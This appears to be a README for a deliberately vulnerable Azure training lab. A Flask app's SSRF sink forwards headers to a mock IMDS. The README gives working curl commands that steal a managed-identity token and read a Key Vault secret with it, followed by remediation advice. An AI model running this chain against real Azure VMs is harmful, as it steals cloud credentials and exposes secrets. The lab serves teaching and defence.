Cloud Lab 08. Azure-IMDS-Managed-Identity — Flask (Python), self-contained  ✅ (exploit verified on this box)

An "Image Fetcher" web app runs on an Azure VM that has a system-assigned managed
identity. The app has an SSRF sink. Azure's IMDS (169.254.169.254) requires the
header "Metadata: true" and its identity endpoint mints a managed-identity access
token for any requested resource. So: SSRF (forwarding Metadata: true) -> token
for https://vault.azure.net -> read a Key Vault secret from the token-protected
vault endpoint. The mock IMDS is internal (127.0.0.1:9111); the mock Key Vault is
on :9112 and rejects requests without the stolen Bearer token (HTTP 401).

1: Get the lab:   unzip Azure-IMDS-Managed-Identity.zip && cd 08-Azure-IMDS-Managed-Identity
2: Deploy (native — verified here):   ./run.sh        # (or: python3 app.py)  needs Flask
   Open in browser:   http://localhost:9110/          <-- {"app":"Image Fetcher (...Azure VM...)",...}
   # Quick win — SSRF -> managed-identity token -> Key Vault secret:
   # a) steal a token for Key Vault (note the required Metadata:true header)
   curl -s -G localhost:9110/fetch \
     --data-urlencode 'url=http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net' \
     --data-urlencode 'hdr=Metadata:true'
   #   -> {"access_token":"eyJ0eXAi...MANAGED-IDENTITY-TOKEN","token_type":"Bearer",...}
   # b) use the stolen token against Key Vault (:9112)
   curl -s -H 'Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1Ni...MANAGED-IDENTITY-TOKEN' \
     localhost:9112/secrets/db-conn
   #   -> {"value":"Server=prod-sql;...;Password=Azure-Sup3r-Secret!",...}
   # Control: Key Vault without the token returns HTTP 401; IMDS without
   #          "Metadata: true" returns HTTP 400.
3: Stop:  Ctrl-C

Requirements:
    Python 3 + Flask                (native run — no Docker, no Azure account)
    curl

Endpoints:
    GET  /                                       -> banner
    GET  /fetch?url=<url>&hdr=Name:Value          -> SSRF sink, forwards caller headers  [SSRF]
    (mock Azure IMDS 127.0.0.1:9111 — needs "Metadata: true")
    (mock Key Vault  :9112 /secrets/<name>       -> needs "Authorization: Bearer <token>")

List of Vulnerabilities (all verified on this box):
    SSRF with header control — /fetch fetches any URL and forwards attacker-set
        headers, so the "Metadata: true" guard is trivially satisfied.
    Managed-identity token theft — SSRF to the IMDS identity endpoint returns an
        access token scoped to Key Vault.
    Key Vault secret exposure — the stolen token reads a production DB connection
        string (secret) from the vault.

Remediation: block SSRF egress to 169.254.169.254; scope the managed identity to
least privilege; prefer Key Vault references over broad token grants; monitor IMDS
token requests.
